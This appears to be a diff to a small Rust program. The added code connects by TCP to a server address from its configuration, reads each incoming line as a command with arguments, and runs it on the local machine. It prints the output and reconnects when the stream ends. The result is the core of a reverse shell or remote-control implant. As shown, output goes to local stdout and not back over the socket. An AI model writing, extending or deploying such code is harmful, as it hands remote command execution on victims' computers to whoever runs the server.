@@ -1,18 +1,31 @@
 mod env;
 
 use std::{
-    io::{BufRead, BufReader},
+    io::{BufRead, BufReader, BufWriter, Write},
     net::TcpStream,
+    process::Command,
     time::Duration,
 };
 
 use env::init_env;
 
 fn connect(attempts: i32) {
-    match TcpStream::connect(init_env().server_url) {
+    let client = TcpStream::connect(init_env().server_url);
+    match client {
         Ok(stream) => {
             let reader = BufReader::new(&stream);
-            for line in reader.lines().flatten() {}
+            for line in reader.lines().flatten() {
+                let input: Vec<&str> = line.split_whitespace().collect();
+                let cmd = input.first().unwrap();
+                let args: Vec<&str> = input
+                    .iter()
+                    .enumerate()
+                    .filter(|(idx, _)| *idx != 0_usize)
+                    .map(|(_, v)| *v)
+                    .collect();
+                let output = Command::new(cmd).args(args).output().unwrap();
+                println!("{}", String::from_utf8(output.stdout).unwrap());
+            }
             connect(init_env().retry_attempts);
         }
         Err(_) => {
